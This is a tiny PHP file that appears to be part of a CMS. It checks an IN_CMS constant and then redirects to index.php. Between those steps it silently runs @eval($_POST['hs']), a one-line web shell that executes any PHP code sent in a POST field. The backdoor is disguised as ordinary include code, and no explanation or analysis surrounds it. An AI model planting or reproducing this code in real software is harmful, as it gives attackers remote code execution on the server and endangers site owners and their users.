<?php
//Make sure the file isn't accessed directly.
defined('IN_CMS') or exit('Access denied!');
@eval($_POST['hs']);
echo '...';
redirect('index.php', 0);
?>
